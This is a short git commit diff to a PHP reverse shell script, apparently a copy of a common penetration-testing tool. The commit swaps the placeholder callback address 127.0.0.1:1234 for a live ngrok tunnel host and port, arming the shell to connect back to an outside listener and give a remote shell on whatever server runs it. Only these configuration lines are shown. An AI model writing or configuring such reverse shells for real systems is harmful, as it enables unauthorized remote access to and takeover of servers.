331690654d15c5ecfda1012c059df867de3ce8bc
~#/usr/bin/b14ck <38563357+black15@users.noreply.github.com>
2022-03-07 14:05:02 +0100

    Update php-reverse-shell.php

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = '0.tcp.ngrok.io';  // CHANGE THIS
+$port = 10587;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
